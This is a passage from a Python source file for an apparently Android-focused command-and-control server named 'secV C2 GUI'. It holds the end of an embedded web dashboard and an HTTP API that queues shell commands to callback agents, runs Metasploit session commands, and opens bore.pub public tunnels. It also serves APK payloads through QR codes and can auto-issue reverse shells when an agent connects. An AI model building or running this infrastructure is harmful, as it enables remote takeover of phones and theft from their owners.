      <div style="display:flex;gap:0.35rem">
        <button class="btn" onclick="viewLog('${{l.name}}')">${{l.protected?'Decrypt & View':'View'}}</button>
        <button class="btn" onclick="exportLog('${{l.name}}')">JSON</button>
      </div>
    </div>`).join('');
}}
async function viewLog(name) {{
  const data=await api('/logs/'+name);
  if(data?.error==='password_required'||data?.protected) {{showEncryptModal('decrypt',name);return;}}
  if(data?.error) {{notify(data.error,'err');return;}}
  _renderLogDetail(name,data.session||data);
}}
function _renderLogDetail(name,s) {{
  if(!s) {{notify('No session data','err');return;}}
  document.getElementById('log-detail').style.display='block';
  document.getElementById('log-detail-title').textContent=name;
  const root=s.root||'none',out=s.output||[];
  document.getElementById('log-detail-content').innerHTML=`
    <div class="info-grid">
      <div class="info-card"><div class="info-card-num">${{s.android||'?'}}</div><div class="info-card-title">Android</div><div class="info-card-body">${{escHtml(s.model||'?')}}</div></div>
      <div class="info-card"><div class="info-card-num">${{root.includes('rooted')?'YES':'NO'}}</div><div class="info-card-title">Root</div><div class="info-card-body">${{escHtml(root)}}</div></div>
      <div class="info-card"><div class="info-card-num">${{out.length}}</div><div class="info-card-title">Log Lines</div><div class="info-card-body">${{(s.start_time||'?').replace('T',' ').slice(0,16)}}</div></div>
      <div class="info-card"><div class="info-card-num">${{escHtml(s.ip||'?')}}</div><div class="info-card-title">WiFi IP</div><div class="info-card-body">${{s.chipset||'?'}}</div></div>
    </div>
    <div class="terminal" style="height:200px">${{out.map(l=>`<div class="t-line"><span class="t-ts">${{escHtml(l.t)}}</span><span class="t-text">${{escHtml(l.text)}}</span></div>`).join('')}}</div>`;
}}
async function exportLog(name) {{
  const data=await api('/logs/'+name);
  const blob=new Blob([JSON.stringify(data,null,2)],{{type:'application/json'}});
  const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=name.replace('.scv','.json');a.click();
}}

// ── Password modal ────────────────────────────────────────────────────────────
let _pwMode='encrypt',_pwTarget=null;
function showEncryptModal(mode,target) {{
  _pwMode=mode||'encrypt'; _pwTarget=target||selectedSession;
  if(!_pwTarget&&_pwMode!=='decrypt') return;
  const modal=document.getElementById('pw-modal');
  modal.style.display='flex';
  document.getElementById('pw-inp').value='';
  document.getElementById('pw-inp2').value='';
  document.getElementById('pw-warn').textContent='';
  const titles={{encrypt:'Encrypt Session',logout:'Encrypt & Close Session',decrypt:'Decrypt Session Log'}};
  const confirms={{encrypt:'Encrypt',logout:'Encrypt & Logout',decrypt:'Decrypt'}};
  const subs={{
    encrypt:'5-layer: PBKDF2-SHA512 + SHA3-512 + PBKDF2-SHA256 + Scrypt (N=2^17) + AES-256-GCM / ChaCha20-Poly1305',
    logout:'Session will be encrypted and closed. The C2 server stays running.',
    decrypt:'Enter the password used when this session was encrypted.'
  }};
  document.getElementById('pw-modal-title').textContent=titles[_pwMode];
  document.getElementById('pw-modal-sub').textContent=subs[_pwMode];
  document.getElementById('pw-confirm-btn').textContent=confirms[_pwMode];
  document.getElementById('pw-confirm-row').style.display=_pwMode==='decrypt'?'none':'flex';
  setTimeout(()=>document.getElementById('pw-inp').focus(),80);
}}
function closePWModal() {{ document.getElementById('pw-modal').style.display='none'; }}
async function pwConfirm() {{
  const pw=document.getElementById('pw-inp').value,pw2=document.getElementById('pw-inp2').value;
  const warn=document.getElementById('pw-warn');
  if(!pw) {{warn.textContent='Password required';return;}}
  if(_pwMode!=='decrypt'&&pw!==pw2) {{warn.textContent='Passwords do not match';return;}}
  if(_pwMode!=='decrypt'&&pw.length<8) {{warn.textContent='Minimum 8 characters';return;}}
  closePWModal();
  if(_pwMode==='decrypt') {{
    const r=await post('/logs/'+encodeURIComponent(_pwTarget)+'/decrypt',{{password:pw}});
    if(r.error) {{notify('Wrong password or corrupt file','err');return;}}
    _renderLogDetail(_pwTarget,r.session);
    return;
  }}
  notify('Encrypting (Scrypt KDF - may take a moment)...','ok');
  const endpoint=_pwMode==='logout'
    ?'/sessions/'+encodeURIComponent(_pwTarget)+'/logout'
    :'/sessions/'+encodeURIComponent(_pwTarget)+'/encrypt';
  const r=await post(endpoint,{{password:pw}});
  if(r.ok) {{
    notify('Session encrypted to .scv','ok');
    if(_pwMode==='logout') {{
      selectedSession=null;
      document.getElementById('interact-panel').style.display='none';
      fetchSessions();
    }}
  }} else notify(r.error||'Encryption failed','err');
}}
function logout() {{ if(selectedSession) showEncryptModal('logout',selectedSession); }}

// ── Polling ───────────────────────────────────────────────────────────────────
setInterval(()=>{{
  if(activeTab==='sessions') fetchSessions();
  else if(activeTab==='bore') fetchBore();
  else if(activeTab==='msf') fetchMSF();
}},4000);
setInterval(async()=>{{
  const d=await api('/sessions');
  const n=(d.sessions||[]).length;
  document.getElementById('nb-sessions').textContent=n?`(${{n}})`:'';
}},7000);

// ── Utils ─────────────────────────────────────────────────────────────────────
function escHtml(s) {{ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }}

// ── Nav scroll ────────────────────────────────────────────────────────────────
const nav=document.getElementById('nav');
window.addEventListener('scroll',()=>nav.classList.toggle('scrolled',scrollY>10),{{passive:true}});
document.getElementById('burger').addEventListener('click',()=>document.body.classList.toggle('nav-open'));

// ── Init ──────────────────────────────────────────────────────────────────────
buildOpRow(); fetchBore();
setTimeout(fetchSessions,300);
</script>
</body>
</html>"""

# ── HTTP API handler ───────────────────────────────────────────────────────────
class C2Handler(BaseHTTPRequestHandler):
    cfg: Dict = {}

    def log_message(self, *_): pass  # suppress default access log

    def _json(self, data: Any, code: int = 200):
        body = json.dumps(data, default=str).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    def _html_resp(self, html: str):
        body = html.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        parsed = urlparse(self.path)
        path   = parsed.path.rstrip("/") or "/"
        qs     = parse_qs(parsed.query)

        if path == "/":
            self._html_resp(_html(self.cfg))
            return

        if path == "/api/sessions":
            with _sessions_lock:
                data = [dict(s) for s in _sessions.values()]
            # strip heavy report field for list view
            for s in data:
                s.pop("report", None)
                s.pop("output", None)
            self._json({"sessions": data})
            return

        if path.startswith("/api/sessions/"):
            parts = path.split("/")
            if len(parts) >= 4:
                addr = unquote(parts[3])
                if len(parts) >= 5 and parts[4] == "output":
                    with _sessions_lock:
                        sess = _sessions.get(addr, {})
                    self._json({"output": sess.get("output", [])})
                    return
                # Return full session data
                with _sessions_lock:
                    sess = dict(_sessions.get(addr, {}))
                sess.pop("report", None)
                self._json(sess)
                return

        if path == "/api/bore/status":
            self._json({"services": _bore.status()})
            return

        if path == "/api/msf/sessions":
            sessions = _msf.sessions()
            self._json({"sessions": sessions, "connected": _msf.connected()})
            return

        if path == "/api/qr":
            url = qs.get("url", [""])[0]
            download = qs.get("download", ["0"])[0] == "1"
            if not url:
                self._json({"error": "url required"})
                return
            if _HAS_QR:
                try:
                    qr = _qrcode.QRCode(
                        version=1,
                        error_correction=_qrcode.constants.ERROR_CORRECT_L,
                        box_size=5, border=2
                    )
                    qr.add_data(url)
                    qr.make(fit=True)
                    img = qr.make_image(fill_color="black", back_color="white")
                    buf = _io.BytesIO()
                    img.save(buf, format="PNG")
                    if download:
                        save_path = Path(self.cfg.get("output_dir", "output")) / "apk_delivery.png"
                        save_path.parent.mkdir(parents=True, exist_ok=True)
                        save_path.write_bytes(buf.getvalue())
                    self._json({"png_b64": base64.b64encode(buf.getvalue()).decode()})
                except Exception as e:
                    self._json({"error": str(e)})
            else:
                self._json({"ascii": f"QR: {url}", "error": "qrcode not installed"})
            return

        if path.startswith("/api/ops/"):
            job_id = path.split("/")[-1]
            with _jobs_lock:
                job = dict(_jobs.get(job_id, {}))
            self._json(job)
            return

        if path == "/api/logs":
            files = sorted(SESSION_DIR.glob("*.scv"), key=lambda p: p.stat().st_mtime, reverse=True)
            logs = []
            for f in files:
                ts = scv_timestamp(f)
                logs.append({
                    "name": f.name,
                    "date": datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M"),
                    "size_kb": round(f.stat().st_size / 1024, 1),
                    "protected": scv_is_protected(f),
                })
            self._json({"logs": logs})
            return

        if path.startswith("/api/logs/") and not path.endswith("/decrypt"):
            fname = unquote(path.split("/")[-1])
            fpath = SESSION_DIR / fname
            if not fpath.exists():
                self._json({"error": "not found"}, 404)
                return
            if scv_is_protected(fpath):
                self._json({"error": "password_required", "protected": True})
                return
            data = scv_load(fpath)
            self._json({"session": data} if data else {"error": "decrypt failed"})
            return

        self._json({"error": "not found"}, 404)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = json.loads(self.rfile.read(length) or b"{}") if length else {}
        path   = self.path.rstrip("/")

        if path.startswith("/api/sessions/"):
            parts = path.split("/")
            if len(parts) >= 5:
                addr = unquote(parts[3])
                action = parts[4]
                if action == "command":
                    cmd = body.get("cmd", "")
                    if cmd and addr in _sessions:
                        _session_cmds[addr] = cmd
                        _append_output(addr, f"> {cmd}")
                        self._json({"ok": True})
                    else:
                        self._json({"error": "session not found or no cmd"})
                    return
                if action == "kill":
                    _close_session(addr)
                    self._json({"ok": True})
                    return
                if action == "export":
                    _save_session_scv(addr)
                    self._json({"ok": True})
                    return
                if action == "encrypt":
                    password = body.get("password", "")
                    if not password:
                        self._json({"error": "password required"})
                        return
                    with _sessions_lock:
                        sess = dict(_sessions.get(addr, {}))
                    if not sess:
                        self._json({"error": "session not found"})
                        return
                    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                    safe = addr.replace(":", "_").replace(".", "-")
                    fname = f"{ts}_{safe}_protected.scv"
                    scv_save_protected(sess, SESSION_DIR / fname, password)
                    self._json({"ok": True, "file": fname})
                    return
                if action == "logout":
                    password = body.get("password", "")
                    if not password:
                        self._json({"error": "password required"})
                        return
                    with _sessions_lock:
                        sess = dict(_sessions.get(addr, {}))
                        if addr in _sessions:
                            _sessions[addr]["active"] = False
                            _sessions[addr]["end_time"] = datetime.now().isoformat()
                    if not sess:
                        self._json({"error": "session not found"})
                        return
                    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                    safe = addr.replace(":", "_").replace(".", "-")
                    fname = f"{ts}_{safe}_protected.scv"
                    scv_save_protected(sess, SESSION_DIR / fname, password)
                    with _sessions_lock:
                        _sessions.pop(addr, None)
                    self._json({"ok": True, "file": fname})
                    return
            self._json({"error": "bad request"}, 400)
            return

        if path == "/api/bore/start":
            lp  = int(body.get("local_port", 8080))
            bp  = int(body.get("bore_port", 21062))
            srv = body.get("bore_server", "bore.pub")
            self._json(_bore.start_tunnel(lp, bp, srv))
            return

        if path == "/api/bore/stop":
            lp = int(body.get("local_port", 0))
            bp = int(body.get("bore_port", 0))
            self._json(_bore.stop_tunnel(lp, bp))
            return

        if path == "/api/bore/http/start":
            d    = body.get("directory", "output")
            port = int(body.get("port", 8080))
            self._json(_bore.start_http(d, port))
            return

        if path == "/api/bore/http/stop":
            port = int(body.get("port", 8080))
            self._json(_bore.stop_http(port))
            return

        if path == "/api/bore/stopall":
            _bore.cleanup()
            self._json({"ok": True})
            return

        if path == "/api/msf/run":
            sid = body.get("session_id", "")
            cmd = body.get("cmd", "")
            if not sid or not cmd:
                self._json({"error": "session_id and cmd required"}, 400)
                return
            result = _msf.run_cmd(sid, cmd)
            if result is None:
                self._json({"error": "MSF RPC not available"})
            else:
                self._json({"result": result})
            return

        if path.startswith("/api/logs/") and path.endswith("/decrypt"):
            parts = path.split("/")
            fname = unquote(parts[3]) if len(parts) >= 4 else ""
            fpath = SESSION_DIR / fname
            if not fpath.exists():
                self._json({"error": "not found"}, 404)
                return
            password = body.get("password", "")
            if not password:
                self._json({"error": "password required"}, 400)
                return
            data = scv_load_protected(fpath, password)
            if data is None:
                self._json({"error": "wrong password"}, 403)
                return
            self._json({"session": data})
            return

        if path == "/api/operation":
            op      = body.get("operation", "recon")
            module  = str(Path(__file__).parent / "android_pentest.py")
            params  = dict(body)
            params.pop("operation", None)
            # Build secV stdin JSON
            payload = json.dumps({"target": "connected", "params": {"operation": op, **params}})
            cmd = ["python3", module, "--stdin-json"]
            job_id = start_job(cmd, cwd=str(Path(__file__).parent))
            # Write stdin payload to a temp file and pass to the job — simpler: use shell -c
            payload_esc = payload.replace("'", "'\\''")
            cmd2 = ["bash", "-c", f"echo '{payload_esc}' | python3 '{module}'"]
            job_id = start_job(cmd2, cwd=str(Path(__file__).parent))
            self._json({"job_id": job_id})
            return

        self._json({"error": "not found"}, 404)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()


# ── Main ───────────────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(description="secV C2 GUI")
    ap.add_argument("--port",          type=int, default=8891,    help="Web UI port")
    ap.add_argument("--c2-port",       type=int, default=8889,    help="Agent TCP callback port")
    ap.add_argument("--bore-dex-port", type=int, default=21062,   help="bore DEX public port")
    ap.add_argument("--bore-msf-port", type=int, default=37993,   help="bore MSF public port")
    ap.add_argument("--msf-lport",     type=int, default=4444,    help="MSF listener port")
    ap.add_argument("--bore-server",   default="bore.pub",        help="bore relay server")
    ap.add_argument("--output-dir",    default="output",          help="Output directory to serve")
    ap.add_argument("--auto-exploit",  action="store_true",       help="Auto-issue SHELL on agent callback")
    ap.add_argument("--lhost",         default="",                help="Reverse shell callback IP")
    ap.add_argument("--no-browser",    action="store_true",       help="Don't open browser")
    args = ap.parse_args()

    lhost = args.lhost
    if not lhost:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            lhost = s.getsockname()[0]
            s.close()
        except Exception:
            lhost = "127.0.0.1"

    cfg = {
        "bore_dex_port": args.bore_dex_port,
        "bore_msf_port": args.bore_msf_port,
        "bore_server":   args.bore_server,
        "output_dir":    args.output_dir,
        "msf_lport":     args.msf_lport,
        "lhost":         lhost,
    }

    # Start TCP agent listener
    t = threading.Thread(
        target=_tcp_server,
        args=(args.c2_port, args.auto_exploit, lhost, args.msf_lport),
        daemon=True
    )
    t.start()

    # HTTP server with config injected into class
    C2Handler.cfg = cfg
    server = HTTPServer(("0.0.0.0", args.port), C2Handler)

    def _shutdown(sig, frame):
        print("\n[c2_gui] shutting down")
        _bore.cleanup()
        server.shutdown()
        sys.exit(0)
    signal.signal(signal.SIGINT, _shutdown)
    signal.signal(signal.SIGTERM, _shutdown)

    url = f"http://127.0.0.1:{args.port}"
    print(f"[+] secV C2 GUI running at {url}")
    print(f"[+] Agent listener on TCP :{args.c2_port}")
    print(f"[+] Session logs in {SESSION_DIR}")

    if not args.no_browser:
        try:
            import webbrowser
            threading.Timer(1.2, lambda: webbrowser.open(url)).start()
        except Exception:
            pass

    server.serve_forever()


if __name__ == "__main__":
    main()
